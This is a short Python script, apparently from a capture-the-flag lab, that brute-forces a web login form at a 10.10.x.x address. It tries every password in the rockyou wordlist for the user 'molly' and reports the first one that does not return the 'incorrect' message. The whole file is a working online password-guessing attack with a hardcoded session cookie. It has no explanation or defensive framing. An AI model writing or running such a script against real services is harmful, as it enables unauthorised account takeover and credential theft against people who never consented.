#!/usr/bin/python3

import requests
import sys

def login(password):
	cookies = {
	    'connect.sid': 's%3AefCuXmmY6-CJz6vpcJi0HYsnNod08SnS.AVDt7V4lZHvuShbtuKrCOIEJdhIAvvz8VXlKqz9GduU',
	}

	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Referer': 'http://10.10.82.119/login',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'http://10.10.82.119',
	    'Connection': 'keep-alive',
	    'Upgrade-Insecure-Requests': '1',
	    'Pragma': 'no-cache',
	    'Cache-Control': 'no-cache',
	}

	data = {
	  'username': 'molly',
	  'password': password
	}

	response = requests.post('http://10.10.82.119/login', headers=headers, cookies=cookies, data=data)
	if "Your username or password is incorrect." not in response.text:
		print("Password Found: " + password)
		sys.exit()

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as wordlist:
	passwords = [ x.strip() for x in wordlist if x ]
	for password in passwords:
		print("Trying Password: " + password)
		login(password)
